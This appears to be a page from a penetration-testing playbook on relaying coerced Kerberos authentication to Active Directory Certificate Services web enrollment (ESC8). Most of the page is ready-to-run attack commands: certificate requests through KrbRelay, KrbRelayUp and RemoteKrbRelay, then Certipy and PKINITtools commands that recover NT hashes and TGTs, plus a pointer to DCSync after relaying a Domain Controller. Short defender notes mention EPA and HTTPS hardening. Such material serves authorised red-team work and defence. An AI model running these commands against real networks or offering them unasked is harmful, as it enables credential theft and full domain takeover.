**Kerberos relay to AD CS (ESC8 over Kerberos)** — relay a coerced Kerberos authentication to the AD CS web-enrollment endpoint (`/certsrv/certfnsh.asp`) to enroll a certificate for the relayed account, then use PKINIT to recover its NT hash / a TGT. Because the HTTP enrollment endpoint usually enforces **no** signing, this is the relay that still works after DCOM hardening (see [_Intro to Kerberos Relay](_Intro%20to%20Kerberos%20Relay.md)).

## Discovery

Find the CA / web-enrollment endpoint and confirm ESC8 exposure - see [ADCS Configuration Issues (ESC1-8)](../../ADCS%20Attacks/ADCS%20Configuration%20Issues%20%28ESC1-8%29.md) and the Discovery section of [NTLM Relay to ADCS](../NTLM%20Relay/NTLM%20Relay%20to%20ADCS.md). The endpoint to relay to is `http(s)://CA_FQDN/certsrv/certfnsh.asp`.

**Note:** EPA (Extended Protection for Authentication) on the endpoint defeats this. Cleartext-HTTP enrollment endpoints are always vulnerable.

## Exploitation

Pick the method by where you have a foothold. For the IPv6/DNS-spoof variant, see [mitm6 Kerberos to ESC-8](../mitm6%20relay/Kerberos%20to%20ESC-8%20relay.md) instead.

### Method 1: Local self-relay (KrbRelay)

From local access on the CA (or any host), coerce the machine's own Kerberos auth and relay it back to the AD CS HTTP endpoint.

```batch

KrbRelay.exe -spn http/CA_FQDN -clsid d99e6e74-fc88-11d0-b498-00a0c90312f3 -endpoint certsrv/ -adcs Computer -target CA_FQDN

```

- `-adcs Computer` requests a machine-auth certificate template; use `DomainController` when relaying a DC's auth.
- CLSIDs are OS-build-specific - try alternates from the tool README if one fails.

### Method 2: KrbRelayUp AD CS mode (local → SYSTEM)

Does not need an unsigned LDAP path - relays the local `SYSTEM` Kerberos auth to AD CS.

```batch

KrbRelayUp.exe relay -m adcs -ca "CA_FQDN" -cet Machine
KrbRelayUp.exe spawn -m adcs -ce "CERT_BASE64_OR_PFX_PATH" -cep "CERT_PASS" -sc "COMMAND"

```

**Note:** `-ca` is the CA **server FQDN** (the web-enrollment host) - not the `host\CAName` config string used by certipy/certreq. KrbRelayUp's AD CS flag names vary by build; confirm with `KrbRelayUp.exe relay -h`.

### Method 3: Remote (RemoteKrbRelay)

No code on the victim - triggers a vulnerable DCOM object on `-victim` and relays to the CA.

```batch

RemoteKrbRelay.exe -adcs -template Machine -victim VICTIM_FQDN -target CA_FQDN -clsid d99e6e74-fc88-11d0-b498-00a0c90312f3

```

### Use the certificate (PKINIT)

Recover the NT hash / a TGT from the issued certificate (same as the NTLM ESC8 flow):

```bash

# With Certipy
certipy auth -pfx './TARGET.pfx'

# OR with PKINITtools
gettgtpkinit.py -cert-pfx './TARGET.pfx' 'DOMAIN/TARGET$' 'TARGET.ccache'
KRB5CCNAME=TARGET.ccache getnthash.py 'DOMAIN/TARGET$' -key 'ENCRYPTION_KEY'

```

**Note:** `ENCRYPTION_KEY` is the AS-REP key printed by `gettgtpkinit.py`. Relaying a **Domain Controller's** auth yields a DC certificate → DCSync, see [Dump NTDS.dit](../../Credential%20Dumping/Dump%20NTDS.dit.md).

## Caution

- CLSID must match the target OS build and carry a usable impersonation level; the local COM path needs TCP/135 reachable to the attacker.
- Prefer HTTPS-with-EPA and enrollment-endpoint hardening as the fix (defender note).
- `.NET` relay binaries are statically AV-detected.

## References

- Compass Security - Three-Headed Potato Dog - https://blog.compass-security.com/2024/09/three-headed-potato-dog/
- RemoteKrbRelay - https://github.com/CICADA8-Research/RemoteKrbRelay
- KrbRelay-SMBServer - https://github.com/decoder-it/KrbRelay-SMBServer
- SpecterOps - Certified Pre-Owned - https://posts.specterops.io/certified-pre-owned-d95910965cd2
